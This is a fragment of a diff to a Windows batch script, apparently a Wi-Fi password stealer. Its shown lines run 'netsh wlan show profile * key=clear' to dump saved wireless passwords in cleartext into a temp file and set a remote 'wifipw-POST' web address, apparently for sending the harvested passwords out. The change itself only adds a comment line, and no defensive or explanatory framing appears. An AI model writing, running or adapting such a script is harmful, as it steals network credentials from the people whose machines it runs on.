@@ -3,6 +3,7 @@ netsh wlan show profile * key=clear>>%tmp%\wifi.url
 ::vars:
 set "website=http://website.com/wifipw-POSTv1.1.html"
 set "echoquestion=off"
+::
 if %echoquestion% == off goto off
 if %echoquestion% == on goto on
 :off
